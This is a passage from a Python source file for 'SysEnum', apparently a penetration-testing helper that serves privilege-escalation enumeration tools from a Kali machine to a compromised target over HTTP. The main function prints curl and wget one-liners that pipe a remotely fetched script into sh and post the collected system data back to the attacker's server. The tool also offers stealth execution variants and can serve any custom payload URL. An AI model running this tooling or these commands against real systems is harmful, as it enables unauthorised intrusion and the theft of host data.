        print(f"\n  {B}  ── {gdata['label']} ──{RST}")
        for line in gdata["lines"]:
            if line.startswith("#"):
                print(f"  {DIM}  {line}{RST}")
            elif line == "":
                print()
            else:
                print(f"  {W}  {line}{RST}")

def print_guide(name, info, writable):
    guide = info.get("guide", [])
    if not guide:
        return
    dest = f"{writable}/{name}"
    print(f"\n  {C}  HOW TO USE — {name}{RST}")
    for tip in guide:
        try:
            tip_fmt = tip.format(path=dest, writable=writable)
        except Exception:
            tip_fmt = tip
        print(f"  {DIM}  → {tip_fmt}{RST}")

def print_extra_exec_variants(name, info, writable):
    """Print alternative execute commands if defined."""
    dest = f"{writable}/{name}"
    variants = {}
    for key in ["exec_save", "exec_all", "exec_stealth", "exec_verbose",
                "exec_thorough", "exec_py2"]:
        val = info.get(key)
        if val:
            try:
                variants[key] = val.format(path=dest, writable=writable)
            except Exception:
                variants[key] = val
    if not variants:
        return
    labels = {
        "exec_save":     "save output",
        "exec_all":      "all checks ",
        "exec_stealth":  "stealth    ",
        "exec_verbose":  "verbose    ",
        "exec_thorough": "thorough   ",
        "exec_py2":      "python2    ",
    }
    print(f"\n  {C}  EXECUTE VARIANTS{RST}")
    for key, cmd in variants.items():
        label = labels.get(key, key)
        print(f"  {DIM}  [{label}]{RST} {W}{cmd}{RST}")

def print_missing_tools(missing, tool_defs):
    if not missing:
        return
    print_section("MISSING TOOLS — Not in cache")
    for name in missing:
        github = tool_defs.get(name, {}).get("github", "see GitHub")
        print(f"  {R}[✗]{RST} {name:<32} {DIM}{github}{RST}")
    print(f"\n  {Y}[*]{RST} Use cache management [c] at startup to download missing tools")

# ─────────────────────────────────────────────────────────────
# CUSTOM URL HANDLER
# ─────────────────────────────────────────────────────────────

def handle_custom_url(kali_ip, port, os_type, writable, manifest):
    print_section("Custom Tool / URL")
    print(f"  {W}[1]{RST} External URL — target downloads directly from internet")
    print(f"  {W}[2]{RST} Download to Kali cache now → serve via SysEnum HTTP")
    ch = input(f"\n  {Y}>{RST} ").strip()

    url  = input(f"  {Y}[?]{RST} URL: ").strip()
    name = input(f"  {Y}[?]{RST} Filename to use on target: ").strip()

    if ch == "2":
        dest = CACHE_CUSTOM / name
        print(f"  {Y}[*]{RST} Downloading {name}...")
        try:
            urllib.request.urlretrieve(url, dest)
            os.chmod(dest, 0o755)
            manifest.setdefault("custom", {})[name] = {
                "cached": True, "os_type": os_type,
                "cached_at": datetime.now().strftime("%Y-%m-%d"),
                "source": url,
            }
            save_manifest(manifest)
            url = f"http://{kali_ip}:{port}/{name}"
            print(f"  {G}[+]{RST} Cached → served at {C}{url}{RST}")
        except Exception as e:
            print(f"  {R}[!]{RST} Download failed: {e}")
            return

    ext     = Path(name).suffix.lower()
    type_map = {".sh": "sh", ".py": "py", ".exe": "exe", ".ps1": "ps1", ".bat": "bat"}
    t       = type_map.get(ext, "sh" if os_type == "linux" else "exe")
    fake    = {"type": t, "guide": []}

    if os_type == "linux":
        lines = gen_linux_oneliners(name, url, writable, fake)
        print_linux_block(name, lines)
    else:
        groups = gen_windows_oneliners(name, url, writable, fake)
        print_windows_block(name, groups)

# ─────────────────────────────────────────────────────────────
# HTTP SERVER
# ─────────────────────────────────────────────────────────────

SCRIPT_DIR = Path(__file__).resolve().parent
COLLECT_SH = SCRIPT_DIR / "sysenum_collect.sh"
OPERATOR_HTML = SCRIPT_DIR / "sysenum_operator.html"
LATEST_DATA = Path("/tmp/sysenum_latest.json")

class QuietHandler(SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        code   = args[1] if len(args) > 1 else "?"
        color  = G if str(code).startswith("2") else R
        ts     = datetime.now().strftime("%H:%M:%S")
        fname  = args[0].split()[-1] if args else "?"
        print(f"  {DIM}[{ts}]{RST} {color}{code}{RST} {W}{fname}{RST}")

    def _send(self, code, body, ctype="text/plain"):
        if isinstance(body, str):
            body = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        # Serve collect script at /sc.sh or /collect.sh — INJECT the Kali base URL
        # at the top so the collector auto-fetches lse/LinEnum/linpeas without
        # relying on $SSH_CLIENT detection.
        if self.path in ("/sc.sh", "/collect.sh", "/sysenum_collect.sh"):
            if COLLECT_SH.exists():
                host_ip = self.headers.get("Host", "").split(":")[0] or self.server.server_address[0]
                port = self.server.server_address[1]
                base = f"http://{host_ip}:{port}"
                content = COLLECT_SH.read_text()
                # Inject right after the shebang
                lines = content.split("\n", 1)
                injected = (
                    lines[0] + "\n"
                    + f"# ── injected by SysEnum.py server ──\n"
                    + f": \"${{SYSENUM_BASE:={base}}}\"\n"
                    + f"export SYSENUM_BASE\n"
                    + (lines[1] if len(lines) > 1 else "")
                )
                self._send(200, injected.encode(), "text/x-shellscript")
                return
            self._send(404, "collect script missing")
            return
        # Serve operator HTML at /op or /operator
        if self.path in ("/op", "/operator", "/sysenum_operator.html", "/"):
            if OPERATOR_HTML.exists():
                html = OPERATOR_HTML.read_bytes()
                # Inject latest collected payload directly into the textarea + run
                # analyze(). We append AFTER the operator's main <script>, so all
                # functions (analyze, parsePayload, etc.) are already defined.
                if LATEST_DATA.exists():
                    try:
                        latest = json.loads(LATEST_DATA.read_text())
                        data_b64 = latest.get("data", "") or ""
                        if data_b64:
                            # JSON-encode the payload string so any quotes/newlines
                            # are escaped correctly for embedding in JS.
                            js_safe = json.dumps("SYSENUM_DATA:" + data_b64)
                            inject = (
                                "<script>(function(){\n"
                                "  function go(){\n"
                                "    var ta=document.getElementById('data');\n"
                                "    if(!ta){setTimeout(go,50);return;}\n"
                                "    if(typeof analyze!=='function'){setTimeout(go,50);return;}\n"
                                "    ta.value=" + js_safe + ";\n"
                                "    analyze();\n"
                                "  }\n"
                                "  if(document.readyState==='loading')\n"
                                "    document.addEventListener('DOMContentLoaded',go);\n"
                                "  else go();\n"
                                "})();</script></body>"
                            ).encode()
                            html = html.replace(b"</body>", inject)
                    except Exception as e:
                        ts = datetime.now().strftime("%H:%M:%S")
                        print(f"  {Y}[*]{RST} [{ts}] failed to inject payload into operator: {e}")
                self._send(200, html, "text/html; charset=utf-8")
                return
            self._send(404, "operator html missing")
            return
        # fall through to file serving from serve_dir
        return super().do_GET()

    def do_POST(self):
        if self.path != "/collect":
            self._send(404, "not found")
            return
        length = int(self.headers.get("Content-Length", "0") or 0)
        raw = self.rfile.read(length).decode("utf-8", errors="replace") if length else ""
        # Extract SYSENUM_DATA line
        data_line = ""
        for line in raw.splitlines():
            if line.startswith("SYSENUM_DATA:"):
                data_line = line[len("SYSENUM_DATA:"):].strip()
                break
        if not data_line:
            self._send(400, "no SYSENUM_DATA line found in body")
            return
        LATEST_DATA.write_text(json.dumps({
            "data": data_line,
            "received_at": datetime.now().isoformat(),
            "from": self.client_address[0],
        }))
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"\n  {G}[+]{RST} {DIM}[{ts}]{RST} collected payload from {C}{self.client_address[0]}{RST} ({len(data_line)} bytes)")
        host_for_url = self.headers.get("Host", "").split(":")[0] or self.server.server_address[0]
        port = self.server.server_address[1]
        op_url = f"http://{host_for_url}:{port}/op"
        local_url = f"http://127.0.0.1:{port}/op"
        print(f"  {Y}[*]{RST} Open in browser: {C}{op_url}{RST}  (or {C}{local_url}{RST})")
        print(f"      {DIM}— data auto-loads and ANALYZE runs on page load.{RST}")
        # Try to open the operator in a browser
        try:
            import webbrowser
            webbrowser.open(f"http://127.0.0.1:{self.server.server_address[1]}/op")
        except Exception:
            pass
        self._send(200, "ok\n")

def start_server(serve_dir, port):
    os.chdir(serve_dir)
    handler = lambda *a, **kw: QuietHandler(*a, directory=str(serve_dir), **kw)
    server  = HTTPServer(("0.0.0.0", port), handler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server

# ─────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────

def main():
    init_cache()
    manifest = load_manifest()

    print(f"\n  {DIM}SysEnum — @Mahdiesta | xl337x{RST}")
    print(LINE)

    ch = input(f"  {W}[c]{RST} Cache management   {W}[Enter]{RST} Start: ").strip().lower()
    if ch == "c":
        manifest = cache_management_menu(manifest)

    # Interface
    iface, kali_ip = select_interface()

    # OS
    print_section("Target OS")
    print(f"  {W}[1]{RST} Linux")
    print(f"  {W}[2]{RST} Windows")
    os_ch   = input(f"\n  {Y}[?]{RST} Select [1]: ").strip() or "1"
    os_type = "linux" if os_ch != "2" else "windows"
    print(f"  {G}[+]{RST} Mode: {C}{os_type.upper()}{RST}")

    # Writable path
    writable = select_writable_path(os_type)

    # Writability test
    print(f"\n  {Y}[*]{RST} Test writability on target first:")
    print(f"  {W}  {writability_test(os_type, writable)}{RST}")

    # Sync + load
    print(f"\n  {Y}[*]{RST} Syncing cache...")
    manifest = sync_cache(manifest)
    cached   = get_cached_tools(os_type, manifest)
    missing  = get_missing_tools(os_type, cached)

    # Auto-download anything not already cached
    if missing:
        manifest = download_missing_tools(missing, os_type, manifest)
        # Refresh after downloads so newly fetched tools get served
        cached  = get_cached_tools(os_type, manifest)
        missing = get_missing_tools(os_type, cached)

    # Port
    port = pick_port()

    # Serve directory
    serve_dir = CACHE_LINUX if os_type == "linux" else CACHE_WINDOWS
    # Copy custom tools for this OS into serve dir
    for name, p in cached.items():
        if p.parent == CACHE_CUSTOM:
            dest = serve_dir / name
            if not dest.exists():
                shutil.copy2(p, dest)

    server = start_server(serve_dir, port)

    # ── HEADER ──────────────────────────────────────────────
    print_section("SysEnum — Ready")
    print(f"  {G}[+]{RST} Kali IP   : {C}{kali_ip}{RST}")
    print(f"  {G}[+]{RST} Interface : {W}{iface}{RST}")
    print(f"  {G}[+]{RST} Port      : {C}{port}{RST}")
    print(f"  {G}[+]{RST} URL base  : {C}http://{kali_ip}:{port}/{RST}")
    print(f"  {G}[+]{RST} Cached    : {G}{len(cached)}{RST} tools  "
          f"{R}{len(missing)}{RST} missing")
    print(f"  {G}[+]{RST} Write path: {C}{writable}{RST}")

    # ── SYSENUM v2 COLLECTOR ────────────────────────────────
    if os_type == "linux" and COLLECT_SH.exists():
        print_section("SysEnum v2 — Auto Collector  (one-liner)")
        oneliner = (
            f"curl -s http://{kali_ip}:{port}/sc.sh | sh | "
            f"curl -s -X POST --data-binary @- http://{kali_ip}:{port}/collect"
        )
        wget_oneliner = (
            f"wget -qO- http://{kali_ip}:{port}/sc.sh | sh | "
            f"wget -qO- --post-file=- http://{kali_ip}:{port}/collect"
        )
        print(f"  {DIM}Run this on target — data auto-posts back, operator opens on Kali:{RST}")
        print(f"\n  {DIM}[curl ]{RST}")
        print(f"  {W}{oneliner}{RST}")
        print(f"\n  {DIM}[wget ]{RST}")
        print(f"  {W}{wget_oneliner}{RST}")
        print(f"\n  {C}  Operator URL: http://{kali_ip}:{port}/op  (loads latest data automatically){RST}")

    # ── TOOL BLOCKS ─────────────────────────────────────────
    tool_defs = LINUX_TOOLS if os_type == "linux" else WINDOWS_TOOLS

    for name in tool_defs:           # preserve defined order
        if name not in cached:
            continue
        url  = f"http://{kali_ip}:{port}/{name}"
        info = tool_defs[name]

        if os_type == "linux":
            lines = gen_linux_oneliners(name, url, writable, info)
            print_linux_block(name, lines)
            print_extra_exec_variants(name, info, writable)
        else:
            groups = gen_windows_oneliners(name, url, writable, info)
            print_windows_block(name, groups)

        print_guide(name, info, writable)

    # Custom tools (not in tool_defs)
    for name, p in cached.items():
        if name not in tool_defs:
            url  = f"http://{kali_ip}:{port}/{name}"
            ext  = Path(name).suffix.lower()
            type_map = {".sh":"sh",".py":"py",".exe":"exe",".ps1":"ps1",".bat":"bat"}
            t    = type_map.get(ext, "sh" if os_type=="linux" else "exe")
            fake = {"type": t, "guide": []}
            if os_type == "linux":
                print_linux_block(name, gen_linux_oneliners(name, url, writable, fake))
            else:
                print_windows_block(name, gen_windows_oneliners(name, url, writable, fake))

    # Missing
    print_missing_tools(missing, tool_defs)

    # Custom URL prompt
    print(f"\n{LINE}")
    add = input(f"  {Y}[?]{RST} Add a custom tool URL? (y/N): ").strip().lower()
    if add == "y":
        handle_custom_url(kali_ip, port, os_type, writable, manifest)

    # Keep alive
    print(f"\n{LINE}")
    print(f"  {G}[*]{RST} Server live on {C}http://{kali_ip}:{port}/{RST}")
    print(f"  {DIM}  Incoming requests will appear below. Ctrl+C to stop.{RST}")
    print(LINE)

    def shutdown(sig, frame):
        print(f"\n  {Y}[*]{RST} Shutting down.")
        server.shutdown()
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)

    try:
        signal.pause()
    except AttributeError:
        # Windows host (shouldn't happen but just in case)
        import time
        while True:
            time.sleep(1)

if __name__ == "__main__":
    main()
